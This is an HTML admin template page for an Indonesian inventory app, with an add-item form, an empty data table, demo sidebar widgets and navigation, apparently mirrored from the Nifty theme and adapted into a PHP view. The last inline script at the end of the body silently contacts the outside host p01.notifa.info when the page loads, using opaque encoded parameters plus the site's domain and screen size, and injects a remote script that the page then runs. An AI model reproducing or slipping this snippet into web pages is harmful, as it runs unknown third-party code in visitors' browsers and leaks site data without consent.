
<!DOCTYPE html>
<html lang="en">



<!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:05 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Data Tables | Nifty - Admin Template</title>


    <!--STYLESHEET-->
    <!--=================================================-->

    <!--Open Sans Font [ OPTIONAL ]-->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo-icons.min.css" rel="stylesheet">


    <!--=================================================-->

    <!--=================================================-->

    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url();?>assets/adminlte/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url();?>assets/adminlte/plugins/pace/pace.min.js"></script>


    <!--Demo [ DEMONSTRATION ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo.min.css" rel="stylesheet">



    <!--DataTables [ OPTIONAL ]-->
    <link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/css/dataTables.bootstrap.css" rel="stylesheet">
    <link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/css/responsive.dataTables.min.css" rel="stylesheet">

    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    =================================================-->

    <link rel="stylesheet" type="text/css" href="<?php echo base_url();?>assets/adminlte/css/bootstrap.css">
    <script type="text/javascript" src="<?php echo base_url();?>assets/adminlte/js/jquery.js"></script>
    <script type="text/javascript" src="<?php echo base_url();?>assets/adminlte/js/bootstrap.js"></script>


</head>

<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
<body>
    <div id="container" class="effect aside-float aside-bright mainnav-lg">

        <!--NAVBAR-->
        <!--===================================================-->
        <header id="navbar">
            <div id="navbar-container" class="boxed">

                <!--Brand logo & name-->
                <!--================================-->
                <div class="navbar-header">
                    <a href="index.html" class="navbar-brand">
                        <img src="<?php echo base_url();?>assets/adminlte/img/logo.png" alt="Nifty Logo" class="brand-icon">
                        <div class="brand-title">
                            <span class="brand-text">Nifty</span>
                        </div>
                    </a>
                </div>
                <!--================================-->
                <!--End brand logo & name-->


                <!--Navbar Dropdown-->
                <!--================================-->
                <div class="navbar-content">
                    <ul class="nav navbar-top-links">

                        <!--Navigation toogle button-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="tgl-menu-btn">
                            <a class="mainnav-toggle" href="#">
                                <i class="demo-pli-list-view"></i>
                            </a>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End Navigation toogle button-->

                    </ul>
                    <ul class="nav navbar-top-links">   
                    </ul>
                </div>
            </div>
        </header>
        <!--===================================================-->
        <!--END NAVBAR-->

        <div class="boxed">

            <!--CONTENT CONTAINER-->
            <!--===================================================-->
            <div id="content-container">
                <div id="page-head">

                    <!--Page Title-->
                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                    <div id="page-title">
                        <h1 class="page-header text-overflow">Data Tables</h1>
                    </div>
                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                    <!--End page title-->


                    <!--Breadcrumb-->
                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                    <ol class="breadcrumb">
                    <li><a href="#"><i class="demo-pli-home"></i></a></li>
                    <li><a href="#">Tables</a></li>
                    <li class="active">Data Tables</li>
                    </ol>
                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                    <!--End breadcrumb-->

                </div>


                 <!--Page content-->
                <!--===================================================-->
                <div id="page-content">


                    <!-- Basic Data Tables -->
                    <!--===================================================-->
                    <div class="panel">
                        <br>

               &emsp;&nbsp;
            <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#myModal">Tambah</button>

                        <div class="panel-body">
                            <table id="demo-dt-basic" class="table table-striped table-bordered" cellspacing="0" width="100%">
                                                                 <!-- Modal -->
                <div id="myModal" class="modal fade" role="dialog">
                    <div class="modal-dialog">

                                        <!-- konten modal-->
                                        <div class="modal-content">
                                            <!-- heading modal -->
                                            <div class="modal-header">
                                                <button type="button" class="close" data-dismiss="modal">&times;</button>
                                                <h4 class="modal-title">Tambahkan Data</h4>
                                            </div>
                                            <!-- body modal -->
                                            <div class="modal-body">
                                        <form>
                                          <div class="form-group col-md-6  ">
                                              <label for="kd_barang" class="control-label">Kode Barang</label>
                                              <div class="input-group">
                                                <div class="input-group-addon">
                                                  <i class="fa fa-pencil"></i>
                                                </div>
                                                <input class="form-control" value="" placeholder="Masukkan Kode Barang" name="kd_Barang" type="text" id="kd_barang">
                                              </div>
                                            </div>
                                            <div class="form-group col-md-6  ">
                                                <label for="nama_barang" class="control-label">Nama Barang</label>
                                                <div class="input-group">
                                                  <div class="input-group-addon">
                                                    <i class="fa fa-pencil"></i>
                                                  </div>
                                                  <input class="form-control" value="" placeholder="Masukkan Nama Barang" name="nama_Barang" type="text" id="nama_barang">
                                                </div>
                                              </div>
                                              <div class="form-group col-md-6  ">
                                                  <label for="kd_kategori" class="control-label">Kategori</label>
                                                  <div class="input-group">
                                                    <div class="input-group-addon">
                                                      <i class="fa fa-pencil"></i>
                                                    </div>
                                                    <input class="form-control" value="" placeholder="Masukkan Kategori Barang" name="kd_kategori" type="text" id="kd_kategori">
                                                  </div>
                                              </div>
                                            <div class="form-group col-md-6  ">
														                   <label for="foto" class="control-label">Foto </label>
														                   <div class="input-group">
															                 <div class="input-group-addon">
						                                      <i class="fa fa-file-image-o"></i>
															                 </div>
															                     <input class="form-control" placeholder="Masukkan Foto" name="foto_barang" type="file" id="foto_barang">
														                   </div>
													                  </div>
                                            <div class="form-group col-md-6  ">
                                                <label for="stok" class="control-label">Stok</label>
                                                <div class="input-group">
                                                  <div class="input-group-addon">
                                                    <i class="fa fa-pencil"></i>
                                                  </div>
                                                  <input class="form-control" value="" placeholder="Masukkan Stok Barang" name="stok" type="text" id="stok">
                                                </div>
                                              </div>
                                              <div class="form-group col-md-6  ">
                                                  <label for="harga" class="control-label">Harga</label>
                                                  <div class="input-group">
                                                    <div class="input-group-addon">
                                                      <i class="fa fa-pencil"></i>
                                                    </div>
                                                    <input class="form-control" value="" placeholder="Masukkan Harga Barang" name="harga" type="text" id="harga">
                                                  </div>
                                                </div>
                                                <div class="form-group col-md-6  ">
                                                    <label for="kd_diskon" class="control-label">Diskon</label>
                                                    <div class="input-group">
                                                      <div class="input-group-addon">
                                                        <i class="fa fa-pencil"></i>
                                                      </div>
                                                      <input class="form-control" value="" placeholder="Masukkan Diskon Barang" name="kd_diskon" type="text" id="kd_diskon">
                                                    </div>
                                                  </div>
                                            <button type="submit" class="btn btn-primary">Simpan</button>

                                        </form>
                                            </div>
                                            <!-- footer modal -->
                                            <div class="modal-footer">
                                                <button type="button" class="btn btn-default" data-dismiss="modal">Keluar</button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                             </div>
                                <thead>
                                    <tr>
                                        <th><center>No</center></th>
                                        <th><center>Kode Barang</center></th>
                                        <th><center>Nama Barang</center></th>
                                        <th><center>Kategori</center></th>
                                        <th><center>Foto</center></th>
                                        <th><center>Stok</center></th>
                                        <th><center>Harga</center></th>
                                        <th><center>Diskon</center></th>
                                        <th><center>Status</center></th>
                                        <th><center>Aksi</center></th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                    </tr>
                                </tbody>
                            </table>
                           </div>
                        </div>
                    </div>
                    <!--===================================================-->
                    <!-- End Striped Table -->

                </div>
                <!--===================================================-->
                <!--End page content-->
            </div>
            <!--===================================================-->
            <!--END CONTENT CONTAINER-->

            <!--ASIDE-->
            <!--===================================================-->
            <aside id="aside-container">
                <div id="aside">
                    <div class="nano">
                        <div class="nano-content">

                            <!--Nav tabs-->
                            <!--================================-->
                            <ul class="nav nav-tabs nav-justified">
                                <li class="active">
                                    <a href="#demo-asd-tab-1" data-toggle="tab">
                                        <i class="demo-pli-speech-bubble-7 icon-lg"></i>
                                    </a>
                                </li>
                                <li>
                                    <a href="#demo-asd-tab-2" data-toggle="tab">
                                        <i class="demo-pli-information icon-lg icon-fw"></i> Report
                                    </a>
                                </li>
                                <li>
                                    <a href="#demo-asd-tab-3" data-toggle="tab">
                                        <i class="demo-pli-wrench icon-lg icon-fw"></i> Settings
                                    </a>
                                </li>
                            </ul>
                            <!--================================-->
                            <!--End nav tabs-->



                            <!-- Tabs Content -->
                            <!--================================-->
                            <div class="tab-content">

                                <!--First tab (Contact list)-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <div class="tab-pane fade in active" id="demo-asd-tab-1">
                                    <p class="pad-all text-main text-sm text-uppercase text-bold">
                                        <span class="pull-right badge badge-warning">3</span> Family
                                    </p>

                                    <!--Family-->
                                    <div class="list-group bg-trans">
                                        <a href="#" class="list-group-item">
                                            <div class="media-left pos-rel">
                                                <img class="img-circle img-xs" src="img/profile-photos/2.png" alt="Profile Picture">
                                                <i class="badge badge-success badge-stat badge-icon pull-left"></i>
                                            </div>
                                            <div class="media-body">
                                                <p class="mar-no text-main">Stephen Tran</p>
                                                <small class="text-muteds">Availabe</small>
                                            </div>
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <div class="media-left pos-rel">
                                                <img class="img-circle img-xs" src="img/profile-photos/7.png" alt="Profile Picture">
                                            </div>
                                            <div class="media-body">
                                                <p class="mar-no text-main">Brittany Meyer</p>
                                                <small class="text-muteds">I think so</small>
                                            </div>
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <div class="media-left pos-rel">
                                                <img class="img-circle img-xs" src="img/profile-photos/1.png" alt="Profile Picture">
                                                <i class="badge badge-info badge-stat badge-icon pull-left"></i>
                                            </div>
                                            <div class="media-body">
                                                <p class="mar-no text-main">Jack George</p>
                                                <small class="text-muteds">Last Seen 2 hours ago</small>
                                            </div>
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <div class="media-left pos-rel">
                                                <img class="img-circle img-xs" src="img/profile-photos/4.png" alt="Profile Picture">
                                            </div>
                                            <div class="media-body">
                                                <p class="mar-no text-main">Donald Brown</p>
                                                <small class="text-muteds">Lorem ipsum dolor sit amet.</small>
                                            </div>
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <div class="media-left pos-rel">
                                                <img class="img-circle img-xs" src="img/profile-photos/8.png" alt="Profile Picture">
                                                <i class="badge badge-warning badge-stat badge-icon pull-left"></i>
                                            </div>
                                            <div class="media-body">
                                                <p class="mar-no text-main">Betty Murphy</p>
                                                <small class="text-muteds">Idle</small>
                                            </div>
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <div class="media-left pos-rel">
                                                <img class="img-circle img-xs" src="img/profile-photos/9.png" alt="Profile Picture">
                                                <i class="badge badge-danger badge-stat badge-icon pull-left"></i>
                                            </div>
                                            <div class="media-body">
                                                <p class="mar-no text-main">Samantha Reid</p>
                                                <small class="text-muteds">Offline</small>
                                            </div>
                                        </a>
                                    </div>

                                    <hr>
                                    <p class="pad-all text-main text-sm text-uppercase text-bold">
                                        <span class="pull-right badge badge-success">Offline</span> Friends
                                    </p>

                                    <!--Works-->
                                    <div class="list-group bg-trans">
                                        <a href="#" class="list-group-item">
                                            <span class="badge badge-purple badge-icon badge-fw pull-left"></span> Joey K. Greyson
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <span class="badge badge-info badge-icon badge-fw pull-left"></span> Andrea Branden
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <span class="badge badge-success badge-icon badge-fw pull-left"></span> Johny Juan
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <span class="badge badge-danger badge-icon badge-fw pull-left"></span> Susan Sun
                                        </a>
                                    </div>


                                    <hr>
                                    <p class="pad-all text-main text-sm text-uppercase text-bold">News</p>

                                    <div class="pad-hor">
                                        <p>Lorem ipsum dolor sit amet, consectetuer
                                            <a data-title="45%" class="add-tooltip text-semibold text-main" href="#">adipiscing elit</a>, sed diam nonummy nibh. Lorem ipsum dolor sit amet.
                                        </p>
                                        <small><em>Last Update : Des 12, 2014</em></small>
                                    </div>


                                </div>
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <!--End first tab (Contact list)-->


                                <!--Second tab (Custom layout)-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <div class="tab-pane fade" id="demo-asd-tab-2">

                                    <!--Monthly billing-->
                                    <div class="pad-all">
                                        <p class="pad-ver text-main text-sm text-uppercase text-bold">Billing &amp; reports</p>
                                        <p>Get <strong class="text-main">$5.00</strong> off your next bill by making sure your full payment reaches us before August 5, 2018.</p>
                                    </div>
                                    <hr class="new-section-xs">
                                    <div class="pad-all">
                                        <span class="pad-ver text-main text-sm text-uppercase text-bold">Amount Due On</span>
                                        <p class="text-sm">August 17, 2018</p>
                                        <p class="text-2x text-thin text-main">$83.09</p>
                                        <button class="btn btn-block btn-success mar-top">Pay Now</button>
                                    </div>


                                    <hr>

                                    <p class="pad-all text-main text-sm text-uppercase text-bold">Additional Actions</p>

                                    <!--Simple Menu-->
                                    <div class="list-group bg-trans">
                                        <a href="#" class="list-group-item"><i class="demo-pli-information icon-lg icon-fw"></i> Service Information</a>
                                        <a href="#" class="list-group-item"><i class="demo-pli-mine icon-lg icon-fw"></i> Usage Profile</a>
                                        <a href="#" class="list-group-item"><span class="label label-info pull-right">New</span><i class="demo-pli-credit-card-2 icon-lg icon-fw"></i> Payment Options</a>
                                        <a href="#" class="list-group-item"><i class="demo-pli-support icon-lg icon-fw"></i> Message Center</a>
                                    </div>


                                    <hr>

                                    <div class="text-center">
                                        <div><i class="demo-pli-old-telephone icon-3x"></i></div>
                                        Questions?
                                        <p class="text-lg text-semibold text-main"> (415) 234-53454 </p>
                                        <small><em>We are here 24/7</em></small>
                                    </div>
                                </div>
                                <!--End second tab (Custom layout)-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->


                                <!--Third tab (Settings)-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <div class="tab-pane fade" id="demo-asd-tab-3">
                                    <ul class="list-group bg-trans">
                                        <li class="pad-top list-header">
                                            <p class="text-main text-sm text-uppercase text-bold mar-no">Account Settings</p>
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-1" type="checkbox" checked>
                                                <label for="demo-switch-1"></label>
                                            </div>
                                            <p class="mar-no text-main">Show my personal status</p>
                                            <small class="text-muted">Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</small>
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-2" type="checkbox" checked>
                                                <label for="demo-switch-2"></label>
                                            </div>
                                            <p class="mar-no text-main">Show offline contact</p>
                                            <small class="text-muted">Aenean commodo ligula eget dolor. Aenean massa.</small>
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-3" type="checkbox">
                                                <label for="demo-switch-3"></label>
                                            </div>
                                            <p class="mar-no text-main">Invisible mode </p>
                                            <small class="text-muted">Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. </small>
                                        </li>
                                    </ul>


                                    <hr>

                                    <ul class="list-group pad-btm bg-trans">
                                        <li class="list-header"><p class="text-main text-sm text-uppercase text-bold mar-no">Public Settings</p></li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-4" type="checkbox" checked>
                                                <label for="demo-switch-4"></label>
                                            </div>
                                            Online status
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-5" type="checkbox" checked>
                                                <label for="demo-switch-5"></label>
                                            </div>
                                            Show offline contact
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-6" type="checkbox" checked>
                                                <label for="demo-switch-6"></label>
                                            </div>
                                            Show my device icon
                                        </li>
                                    </ul>



                                    <hr>

                                    <p class="pad-hor text-main text-sm text-uppercase text-bold mar-no">Task Progress</p>
                                    <div class="pad-all">
                                        <p class="text-main">Upgrade Progress</p>
                                        <div class="progress progress-sm">
                                            <div class="progress-bar progress-bar-success" style="width: 15%;"><span class="sr-only">15%</span></div>
                                        </div>
                                        <small>15% Completed</small>
                                    </div>
                                    <div class="pad-hor">
                                        <p class="text-main">Database</p>
                                        <div class="progress progress-sm">
                                            <div class="progress-bar progress-bar-danger" style="width: 75%;"><span class="sr-only">75%</span></div>
                                        </div>
                                        <small>17/23 Database</small>
                                    </div>

                                </div>
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <!--Third tab (Settings)-->

                            </div>
                        </div>
                    </div>
                </div>
            </aside>
            <!--===================================================-->
            <!--END ASIDE-->


             <!--MAIN NAVIGATION-->
            <!--===================================================-->
            <nav id="mainnav-container">
                <div id="mainnav">



                    <!--Menu-->
                    <!--================================-->
                    <div id="mainnav-menu-wrap">
                        <div class="nano">
                            <div class="nano-content">

                                <!--Profile Widget-->
                                <!--================================-->
                                <div id="mainnav-profile" class="mainnav-profile">
                                    <div class="profile-wrap text-center">
                                        <div class="pad-btm">
                                            <img class="img-circle img-md" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/1.png" alt="Profile Picture">
                                        </div>
                                        <a href="#profile-nav" class="box-block" data-toggle="collapse" aria-expanded="false">
                                            <span class="pull-right dropdown-toggle">
                                                <i class="dropdown-caret"></i>
                                            </span>
                                            <p class="mnp-name">Aaron Chavez</p>
                                            <span class="mnp-desc">aaron.cha@themeon.net</span>
                                        </a>
                                    </div>
                                    <div id="profile-nav" class="collapse list-group bg-trans">
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-male icon-lg icon-fw"></i> View Profile
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-gear icon-lg icon-fw"></i> Settings
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-information icon-lg icon-fw"></i> Help
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-unlock icon-lg icon-fw"></i> Logout
                                        </a>
                                    </div>
                                </div>


                                <!--Shortcut buttons-->
                                <!--================================-->
                                <div id="mainnav-shortcut" class="hidden">
                                    <ul class="list-unstyled shortcut-wrap">

                                        <li class="col-xs-3" data-content="My Profile">
                                            <a class="shortcut-grid" href="#">
                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-mint">
                                                <i class="demo-pli-male"></i>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="col-xs-3" data-content="Messages">
                                            <a class="shortcut-grid" href="#">
                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-warning">
                                                <i class="demo-pli-speech-bubble-3"></i>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="col-xs-3" data-content="Activity">
                                            <a class="shortcut-grid" href="#">
                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-success">
                                                <i class="demo-pli-thunder"></i>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="col-xs-3" data-content="Lock Screen">
                                            <a class="shortcut-grid" href="#">
                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-purple">
                                                <i class="demo-pli-lock-2"></i>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <!--================================-->
                                <!--End shortcut buttons-->


                                <ul id="mainnav-menu" class="list-group">

                                    <!--Category name-->
                                    <li class="list-header">Navigation</li>

                                    <!--Menu list item-->
                                    <li class="active-sub">
                                        <a href="<?= base_url().'Dashboard/karyawan' ?>">
                                            <i class="fa fa-home"></i>
                                            <span class="menu-title">
                                                Beranda
                                            </span>
                                        </a>
                                    </li>


                                    <!--Menu item-->
                                    <li>
                                        <a href="<?= base_url().'Barang/kbarang' ?>">
                                            <i class="fa fa-file"></i>
                                            <span class="menu-title">
                                                Data Barang
                                                <span class="pull-right badge badge-warning"></span>
                                            </span>
                                        </a>
                                    </li>

                                     <!--Menu item-->
                                    <li>
                                        <a href="<?= base_url().'Barang_Ready/kbarangre' ?>">
                                            <i class="fa fa-history"></i>
                                            <span class="menu-title">
                                                Barang Ready
                                                <span class="pull-right badge badge-warning"></span>
                                            </span>
                                        </a>
                                    </li>

                                     <!--Menu item-->
                                    <li>
                                        <a href="<?= base_url().'Riwayat/kriwayat' ?>">
                                            <i class="glyphicon glyphicon-list-alt"></i>
                                            <span class="menu-title">
                                                Riwayat Barang
                                                <span class="pull-right badge badge-warning"></span>
                                            </span>
                                        </a>
                                    </li>
                            </div>
                        </div>
                    </div>
                    <!--================================-->
                    <!--End menu-->
                </div>
            </nav>

            <!--===================================================-->
            <!--END MAIN NAVIGATION-->

        </div>



        <!-- FOOTER -->
        <!--===================================================-->
        <footer id="footer">

            <!-- Visible when footer positions are fixed -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <div class="show-fixed pad-rgt pull-right">
                You have <a href="#" class="text-main"><span class="badge badge-danger">3</span> pending action.</a>
            </div>



            <!-- Visible when footer positions are static -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
     <!--       <div class="hide-fixed pull-right pad-rgt">
                14GB of <strong>512GB</strong> Free.
            </div>

    -->

            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->

            <p class="pad-lft">&#0169; </p>



        </footer>
        <!--===================================================-->
        <!-- END FOOTER -->


        <!-- SCROLL PAGE BUTTON -->
        <!--===================================================-->
        <button class="scroll-top btn">
            <i class="pci-chevron chevron-up"></i>
        </button>
        <!--===================================================-->
    </div>
    <!--===================================================-->
    <!-- END OF CONTAINER -->





    <!--JAVASCRIPT-->
    <!--=================================================-->

    <!--jQuery [ REQUIRED ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/jquery.min.js"></script>


    <!--BootstrapJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/bootstrap.min.js"></script>


    <!--NiftyJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/nifty.min.js"></script>




    <!--=================================================-->

    <!--Demo script [ DEMONSTRATION ]-->
  <!--  <script src="<?php echo base_url();?>assets/adminlte/js/demo/nifty-demo.min.js"></script> -->


    <!--DataTables [ OPTIONAL ]-->
    <script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/jquery.dataTables.js"></script>
    <script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
    <script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script>


    <!--DataTables Sample [ SAMPLE ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/demo/tables-datatables.js"></script>




<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUaxQDkkXsQ40smKLX5MuTaP3Hz7CQx99v6v04x8tXILLzaJOlxMW8AqYZK7vJBQ0GeroIrDmsgRoQd3TbDcKFg5ZBqSJkgONBJfmihZkKwZm6n6A8yUgj4nkx3jY0LDUaUhTTSVo18zAU71F%2bg%2fz9XJK7mEBwuR9UbbQUNbpeu8TLlTGwc%2bJ8Q4Ghvlq5a3uLs3tGbSqe%2bIMGFB42NllBOXiUa%2fJS3C%2f4xtm2qCm0o76VDiUn%2fJU4E2PfPUP5k8Q8kqhOs%2f%2fJYJ%2b5E9CA9qTuBEo6UMsqrPZvthp0Oykb75Uu2OV1Q22Y539wDCdiCo%2fWdq8fte8WqybYrW7iOvpOtmuE9ypRwL6%2b5gbKpaecKP8gA8490c03k5TAyLvuWRxyhxBbA0sZtkm3%2b8dHg4FAjhTkRhGG4SmpBOqFSR9NOOtxN2dE8rtluoiMR%2fABnnWziDQHZS%2bjsuB5P1ZZS9wUjx%2bBZgxi5uazzR7I6vPu%2fVdNPdhxC%2fcET" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:10 GMT -->
</html>
